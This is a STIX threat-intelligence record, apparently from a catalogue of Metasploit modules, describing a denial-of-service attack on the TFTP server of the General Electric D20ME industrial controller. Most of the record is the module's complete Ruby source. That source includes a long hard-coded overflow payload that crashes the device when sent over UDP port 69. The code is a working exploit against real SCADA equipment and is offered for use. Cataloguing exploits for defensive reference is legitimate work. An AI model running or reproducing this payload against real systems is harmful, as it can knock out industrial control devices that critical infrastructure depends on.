{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--24177355-c1f3-4e35-8056-60d14b9e83d7",
    "created": "2024-08-14T16:24:51.808876Z",
    "modified": "2024-08-14T16:24:51.80888Z",
    "name": "General Electric D20ME TFTP Server Buffer Overflow DoS",
    "description": " By sending a malformed TFTP request to the GE D20ME, it is possible to crash the device.  This module is based on the original 'd20ftpbo.rb' Basecamp module from DigitalBond. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/scada/d20_tftp_overflow.rb",
            "external_id": "d20_tftp_overflow.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.digitalbond.com/tools/basecamp/metasploit-modules/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# The General Electric D20 (and possibly other devices) have numerous\n# buffer overruns in their TFTP servers and probably other servers.\n# There are many buffer overruns like it, but this one is the D20's\n# TFTP Server transfer-mode overflow.\n# The filename also suffers from an overrun but seems unlikely to be\n# exploitable.\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Rex::Ui::Text\n  include Rex::Proto::TFTP\n  include Msf::Exploit::Remote::Udp\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'General Electric D20ME TFTP Server Buffer Overflow DoS',\n      'Description'    => %q{\n        By sending a malformed TFTP request to the GE D20ME, it is possible to crash the\n        device.\n\n        This module is based on the original 'd20ftpbo.rb' Basecamp module from\n        DigitalBond.\n        },\n      'Author'         =>\n        [\n          'K. Reid Wightman <wightman[at]digitalbond.com>', # original module\n          'todb' # Metasploit fixups\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'URL', 'http://www.digitalbond.com/tools/basecamp/metasploit-modules/' ]\n        ],\n      'DisclosureDate' => '2012-01-19'\n      ))\n\n    register_options(\n      [\n        OptAddressLocal.new('LHOST', [false, \"The local IP address to bind to\"]),\n        OptInt.new('RECV_TIMEOUT', [false, \"Time (in seconds) to wait between packets\", 3]),\n        Opt::RPORT(69)\n      ])\n  end\n\n  def run\n    udp_sock = Rex::Socket::Udp.create(\n      'LocalHost' => datastore['LHOST'] || nil,\n      'PeerHost'  => rhost,\n      'PeerPort' => rport,\n      'Context' => {'Msf' => framework, 'MsfExploit' => self}\n    ) # No need to rescue, it's a UDP faux-socket\n    udp_sock.sendto(payload, rhost, rport)\n    recv = udp_sock.timed_read(65535, recv_timeout)\n    if recv and recv.size > 0\n      udp_sock.sendto(payload, rhost, rport)\n    else\n      print_error \"#{rhost}:#{rport} - TFTP - No response from the target, aborting.\"\n      return\n    end\n    print_good \"#{rhost}:#{rport} - TFTP - DoS complete, the D20 should fault after a timeout.\"\n  end\n\n  def recv_timeout\n    if datastore['RECV_TIMEOUT'].to_i.zero?\n      3\n    else\n      datastore['RECV_TIMEOUT'].to_i.abs\n    end\n  end\n\n  def payload\n    \"\\x00\\x01NVRAM\\\\D20.zlb\\x00netascii\" +\n      \"\\x80\\x80\\x80\\x80\\x80\\x80\\x80\\x81\\x80\\x80\\x80\\x82\\x80\\x80\\x80\\x83\" +\n      \"\\x80\\x80\\x80\\x84\\x80\\x80\\x80\\x85\\x80\\x80\\x80\\x86\\x80\\x80\\x80\\x87\\x80\\x80\\x80\\x88\" +\n      \"\\x80\\x80\\x80\\x89\\x80\\x80\\x80\\x8A\\x80\\x80\\x80\\x8B\\x80\\x80\\x80\\x8C\\x80\\x80\\x80\\x8D\" +\n      \"\\x80\\x80\\x80\\x8E\\x80\\x80\\x80\\x8F\\x80\\x80\\x80\\x90\\x80\\x80\\x80\\x91\\x80\\x80\\x80\\x92\" +\n      \"\\x80\\x80\\x80\\x93\\x80\\x80\\x80\\x94\\x80\\x80\\x80\\x95\\x80\\x80\\x80\\x96\\x80\\x80\\x80\\x97\" +\n      \"\\x80\\x80\\x80\\x98\\x80\\x80\\x80\\x99\\x80\\x80\\x80\\x9A\\x80\\x80\\x80\\x9B\\x80\\x80\\x80\\x9C\" +\n      \"\\x80\\x80\\x80\\x9D\\x80\\x80\\x80\\x9E\\x80\\x80\\x80\\x9F\\x80\\x80\\x80\\xA0\\x80\\x80\\x80\\xA1\" +\n      \"\\x80\\x80\\x80\\xA2\\x80\\x80\\x80\\xA3\\x80\\x80\\x80\\xA4\\x80\\x80\\x80\\xA5\\x80\\x80\\x80\\xA6\" +\n      \"\\x80\\x80\\x80\\xA7\\x80\\x80\\x80\\xA8\\x80\\x80\\x80\\x00\\x80\\x80\\x80\\xAA\\x80\\x80\\x80\\xAB\" +\n      \"\\x80\\x80\\x80\\xAC\\x80\\x80\\x80\\xAD\\x80\\x80\\x80\\xAE\\x80\\x80\\x80\\xAF\\x80\\x80\\x80\\xB0\" +\n      \"\\x80\\x80\\x80\\xB1\\x80\\x80\\x80\\xB2\\x80\\x80\\x80\\xB3\\x80\\x80\\x80\\xB4\\x80\\x80\\x80\\xB5\" +\n      \"\\x80\\x80\\x80\\xB6\\x80\\x80\\x80\\xB7\\x80\\x80\\x80\\xB8\\x80\\x80\\x80\\xB9\\x80\\x80\\x80\\xBA\" +\n      \"\\x80\\x80\\x80\\xBB\\x80\\x80\\x80\\xBC\\x80\\x80\\x80\\xBD\\x80\\x80\\x80\\xBE\\x80\\x80\\x80\\xBF\" +\n      \"\\x80\\x80\\x80\\xC0\\x80\\x80\\x80\\xC1\\x80\\x80\\x80\\xC2\\x80\\x80\\x80\\xC3\\x80\\x80\\x80\\xC4\" +\n      \"\\x80\\x80\\x80\\xC5\\x80\\x80\\x80\\xC6\\x80\\x80\\x80\\xC7\\x80\\x80\\x80\\xC8\\x80\\x80\\x80\\xC9\" +\n      \"\\x80\\x80\\x80\\xCA\\x80\\x80\\x80\\xCB\\x80\\x80\\x80\\xCC\\x80\\x80\\x80\\xCD\\x80\\x80\\x80\\xCE\" +\n      \"\\x80\\x80\\x80\\xCF\\x80\\x80\\x80\\xD0\\x80\\x80\\x80\\xD1\\x80\\x80\\x80\\xD2\\x80\\x80\\x80\\xD3\" +\n      \"\\x80\\x80\\x80\\xD4\\x80\\x80\\x80\\xD5\\x80\\x80\\x80\\xD6\\x80\\x80\\x80\\xD7\\x80\\x80\\x80\\xD8\" +\n      \"\\x80\\x80\\x80\\xD9\\x80\\x80\\x80\\xDA\\x80\\x80\\x80\\xDB\\x80\\x80\\x80\\xDC\\x80\\x80\\x80\\xDD\" +\n      \"\\x80\\x80\\x80\\xDE\\x80\\x80\\x80\\x00\\x00\\x00\\x80\\x00\\x00\\x01\\x80\\xE1\\x80\\x80\\x80\\xE2\" +\n      \"\\x80\\x80\\x80\\xE3\\x80\\x80\\x80\\xE4\\x80\\x80\\x80\\xE5\\x80\\x80\\x80\\xE6\\x80\\x80\\x80\\xE7\" +\n      \"\\x80\\x80\\x80\\xE8\\x80\\x80\\x80\\xE9\\x80\\x80\\x80\\xEA\\x80\\x80\\x80\\xEB\\x80\\x80\\x80\\xEC\" +\n      \"\\x80\\x80\\x00\\x80\\x00\\x00\\x00\\x7F\\xFF\\xBC\\x80\\xEF\\x80\\x80\\x80\\xF0\\x80\\x80\\x80\\xF1\" +\n      \"\\x80\\x80\\x80\\xF2\\x80\\x80\\x80\\xF3\\x80\\x80\\x80\\xF4\\x80\\x80\\x80\\xF5\\x80\\x80\\x80\\xF6\" +\n      \"\\x80\\x80\\x80\\xF7\\x80\\x80\\x80\\xF8\\x80\\x80\\x80\\xF9\\x80\\x80\\x80\\xFA\\x80\\x80\\x80\\xFB\" +\n      \"\\x80\\x80\\x80\\xFC\\x80\\x80\\x80\\xFD\\x80\\x80\\x80\\xFE\\x80\\x80\\x81\\x80\\x80\\x80\\x81\\x81\" +\n      \"\\x80\\x80\\x81\\x82\\x80\\x80\\x81\\x83\\x80\\x80\\x81\\x84\\x80\\x80\\x81\\x85\\x80\\x80\\x81\\x86\" +\n      \"\\x80\\x80\\x81\\x87\\x80\\x80\\x81\\x88\\x80\\x80\\x81\\x89\\x80\\x80\\x81\\x8A\\x80\\x80\\x81\\x8B\" +\n      \"\\x80\\x80\\x81\\x8C\\x80\\x80\\x81\\x8D\\x80\\x80\\x81\\x8E\\x80\\x80\\x81\\x8F\\x80\\x80\\x81\\x90\" +\n      \"\\x80\\x80\\x81\\x91\\x80\\x80\\x81\\x92\\x80\\x80\\x81\\x93\\x80\\x80\\x81\\x94\\x80\\x80\\x81\\x95\" +\n      \"\\x80\\x80\\x81\\x96\\x80\\x80\\x81\\x97\\x80\\x80\\x81\\x98\\x80\\x80\\x81\\x99\\x80\\x80\\x81\\x9A\" +\n      \"\\x80\\x80\\x81\\x9B\\x80\\x80\\x81\\x9C\\x80\\x80\\x81\\x9D\\x80\\x80\\x81\\x9E\\x80\\x80\\x81\\x9F\" +\n      \"\\x80\\x80\\x81\\xA0\\x80\\x80\\x81\\xA1\\x80\\x80\\x81\\xA2\\x80\\x80\\x81\\xA3\\x80\\x80\\x81\\xA4\" +\n      \"\\x80\\x80\\x81\\xA5\\x80\\x80\\x81\\xA6\\x80\\x80\\x81\\xA7\\x80\\x80\\x81\\xA8\\x80\\x80\\x81\\xA9\" +\n      \"\\x80\\x80\\x81\\xAA\\x80\\x80\\x81\\xAB\\x80\\x80\\x81\\xAC\\x80\\x80\\x81\\xAD\\x80\\x80\\x81\\xAE\" +\n      \"\\x80\\x80\\x81\\xAF\\x80\\x80\\x81\\xB0\\x80\\x80\\x81\\xB1\\x80\\x80\\x81\\xB2\\x80\\x80\\x81\\xB3\" +\n      \"\\x80\\x80\\x81\\xB4\\x80\\x80\\x81\\xB5\\x80\\x80\\x81\\xB6\\x80\\x80\\x81\\xB7\\x80\\x80\\x81\\xB8\" +\n      \"\\x80\\x80\\x81\\xB9\\x80\\x80\\x81\\xBA\\x80\\x80\\x81\\xBB\\x80\\x80\\x81\\xBC\\x80\\x80\\x81\\xBD\" +\n      \"\\x80\\x80\\x81\\xBE\\x80\\x80\\x81\\xBF\\x80\\x80\\x81\\xC0\\x80\\x80\\x81\\xC1\\x80\\x80\\x81\\xC2\" +\n      \"\\x80\\x80\\x81\\xC3\\x80\\x80\\x81\\xC4\\x80\\x80\\x81\\xC5\\x80\\x80\\x81\\xC6\\x80\\x80\\x81\\xC7\" +\n      \"\\x80\\x80\\x81\\xC8\\x80\\x80\\x81\\xC9\\x80\\x80\\x81\\xCA\\x80\\x80\\x81\\xCB\\x80\\x80\\x81\\xCC\" +\n      \"\\x80\\x80\\x81\\xCD\\x80\\x80\\x81\\xCE\\x80\\x80\\x81\\xCF\\x80\\x80\\x81\\xD0\\x80\\x80\\x81\\xD1\" +\n      \"\\x80\\x80\\x81\\xD2\\x80\\x80\\x81\\xD3\\x80\\x80\\x81\\xD4\\x80\\x80\\x81\\xD5\\x80\\x80\\x81\\xD6\" +\n      \"\\x80\\x80\\x81\\xD7\\x80\\x80\\x81\\xD8\\x80\\x80\\x81\\xD9\\x80\\x80\\x81\\xDA\\x80\\x80\\x81\\xDB\" +\n      \"\\x80\\x80\\x81\\xDC\\x80\\x80\\x81\\xDD\\x80\\x80\\x81\\xDE\\x80\\x80\\x81\\xDF\\x80\\x80\\x81\\xE0\" +\n      \"\\x80\\x80\\x81\\xE1\\x80\\x80\\x81\\xE2\\x80\\x80\\x81\\xE3\\x80\\x80\\x81\\xE4\\x80\\x80\\x81\\xE5\" +\n      \"\\x80\\x80\\x81\\xE6\\x80\\x80\\x81\\xE7\\x80\\x80\\x81\\xE8\\x80\\x80\\x81\\xE9\\x80\\x80\\x81\\xEA\" +\n      \"\\x80\\x80\\x81\\xEB\\x80\\x80\\x81\\xEC\\x80\\x80\\x81\\xED\\x80\\x80\\x81\\xEE\\x80\\x80\\x81\\xEF\" +\n      \"\\x80\\x80\\x81\\xF0\\x80\\x80\\x81\\xF1\\x80\\x80\\x81\\xF2\\x80\\x80\\x81\\xF3\\x80\\x80\\x81\\xF4\" +\n      \"\\x80\\x80\\x81\\xF5\\x80\\x80\\x81\\xF6\\x80\\x80\\x81\\xF7\\x80\\x80\\x81\\xF8\\x80\\x80\\x81\\xF9\" +\n      \"\\x80\\x80\\x81\\xFA\\x80\\x80\\x81\\xFB\\x80\\x80\\x81\\xFC\\x80\\x80\\x81\\xFD\\x80\\x80\\x81\\xFE\" +\n      \"\\x80\\x80\\x82\\x80\\x80\\x80\\x82\\x81\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-01-19"
}